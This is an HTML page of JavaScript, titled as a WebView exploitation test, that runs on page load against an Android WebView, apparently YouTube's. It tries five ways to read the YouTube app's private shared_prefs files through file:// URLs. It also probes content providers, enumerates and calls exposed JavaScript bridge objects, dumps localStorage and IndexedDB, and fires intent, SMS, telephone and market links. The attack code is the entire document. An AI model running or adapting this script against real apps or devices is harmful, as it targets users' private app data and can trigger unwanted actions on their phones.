
    <html>
    <head>
    <title>CORS Bypass Test</title>
    <script>
    // Test 1: Different methods to read files
    function testFileRead() {
        console.log("[*] Testing file:// access methods");
        
        // Method 1: iframe (might bypass some restrictions)
        var iframe = document.createElement('iframe');
        iframe.src = 'file:///data/data/com.google.android.youtube/shared_prefs/';
        iframe.onload = function() {
            console.log("[*] iframe loaded file:// URL");
            try {
                console.log("[*] iframe content:", iframe.contentDocument.body.innerHTML);
            } catch(e) {
                console.log("[*] iframe access blocked:", e);
            }
        };
        document.body.appendChild(iframe);
        
        // Method 2: Object/Embed tags
        var obj = document.createElement('object');
        obj.data = 'file:///data/data/com.google.android.youtube/shared_prefs/youtube.xml';
        obj.type = 'text/xml';
        obj.onload = function() { console.log("[*] Object loaded"); };
        document.body.appendChild(obj);
        
        // Method 3: link prefetch
        var link = document.createElement('link');
        link.rel = 'prefetch';
        link.href = 'file:///data/data/com.google.android.youtube/shared_prefs/';
        document.head.appendChild(link);
        
        // Method 4: Worker (might have different CORS rules)
        try {
            var worker = new Worker('file:///data/data/com.google.android.youtube/shared_prefs/youtube.xml');
            console.log("[*] Worker created");
        } catch(e) {
            console.log("[*] Worker blocked:", e.message);
        }
        
        // Method 5: fetch with no-cors mode
        fetch('file:///data/data/com.google.android.youtube/shared_prefs/youtube.xml', {
            mode: 'no-cors'
        }).then(r => {
            console.log("[*] fetch no-cors succeeded");
        }).catch(e => {
            console.log("[*] fetch no-cors failed:", e.message);
        });
    }
    
    // Test 2: Access via content:// URI (Android content providers)
    function testContentProvider() {
        console.log("[*] Testing content:// provider access");
        
        // Try YouTube's file provider
        var providers = [
            'content://com.google.android.youtube.fileprovider/',
            'content://com.google.android.youtube.SuggestionProvider/',
            'content://media/external/video/media/',
            'content://downloads/public_downloads/',
        ];
        
        providers.forEach(function(uri) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', uri, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    console.log("[*] Provider", uri, "status:", xhr.status, "response length:", xhr.responseText.length);
                }
            };
            xhr.onerror = function(e) {
                console.log("[*] Provider", uri, "error:", e.type);
            };
            xhr.send();
        });
    }
    
    // Test 3: JavaScript bridge detection
    function testJavaScriptBridges() {
        console.log("[*] Testing for JavaScript bridges");
        
        // Common bridge names used in Android WebViews
        var bridges = [
            'WebViewJavascriptBridge',
            'Android',
            'JSInterface',
            'JavascriptInterface',
            'Bridge',
            'Native',
            'App',
            'YouTube',
            'Youtube',
            'YT',
            'yt',
            'google',
            'Google',
        ];
        
        bridges.forEach(function(bridge) {
            if (window[bridge]) {
                console.log("[!] BRIDGE FOUND:", bridge, "=", window[bridge]);
                
                // Try to enumerate methods
                try {
                    var methods = [];
                    for (var key in window[bridge]) {
                        methods.push(key);
                    }
                    console.log("[!] Bridge methods:", methods.join(', '));
                    
                    // Try to call some methods
                    if (typeof window[bridge].toString === 'function') {
                        console.log("[!] Bridge toString():", window[bridge].toString());
                    }
                } catch(e) {
                    console.log("[*] Bridge enumeration error:", e.message);
                }
            }
        });
        
        // Also check for postMessage handlers
        window.addEventListener('message', function(e) {
            console.log("[!] Message received:", e.data, "from:", e.origin);
        });
        
        // Send test message
        window.postMessage('test', '*');
    }
    
    // Test 4: LocalStorage/IndexedDB access (might store sensitive data)
    function testLocalStorage() {
        console.log("[*] Testing LocalStorage/IndexedDB");
        
        try {
            // Try to access localStorage
            for (var i = 0; i < localStorage.length; i++) {
                var key = localStorage.key(i);
                console.log("[*] localStorage item:", key, "=", localStorage.getItem(key).substring(0, 100));
            }
        } catch(e) {
            console.log("[*] localStorage access error:", e.message);
        }
        
        // Try IndexedDB
        if (window.indexedDB) {
            console.log("[*] IndexedDB available");
            var request = indexedDB.open('youtube');
            request.onsuccess = function(e) {
                console.log("[!] YouTube IndexedDB opened!");
            };
            request.onerror = function(e) {
                console.log("[*] IndexedDB open error");
            };
        }
    }
    
    // Test 5: Protocol handlers and scheme bypass
    function testProtocolHandlers() {
        console.log("[*] Testing protocol handlers");
        
        // Try to trigger various protocols
        var protocols = [
            'intent:#Intent;action=android.intent.action.VIEW;package=com.android.settings;end',
            'sms:+1234567890?body=test',
            'tel:+1234567890',
            'mailto:test@example.com',
            'geo:0,0',
            'market://details?id=com.example.app',
        ];
        
        protocols.forEach(function(proto) {
            var link = document.createElement('a');
            link.href = proto;
            link.click();
            console.log("[*] Triggered protocol:", proto);
        });
        
        // Try to override protocol handling
        window.location = 'intent://youtube.com#Intent;scheme=https;package=com.google.android.youtube;end';
    }
    
    // Auto-run tests
    window.onload = function() {
        console.log("[*] Starting WebView exploitation tests");
        console.log("[*] User Agent:", navigator.userAgent);
        console.log("[*] Platform:", navigator.platform);
        
        setTimeout(testFileRead, 1000);
        setTimeout(testContentProvider, 2000);
        setTimeout(testJavaScriptBridges, 3000);
        setTimeout(testLocalStorage, 4000);
        setTimeout(testProtocolHandlers, 5000);
        
        // Also try to access WebView debug interface
        console.log("[*] Checking for WebView debugging...");
        if (typeof console === 'object' && console.log) {
            console.log("[*] Console available");
        }
    };
    </script>
    </head>
    <body>
    <h1>WebView Exploitation Test</h1>
    <div id="output"></div>
    </body>
    </html>
    
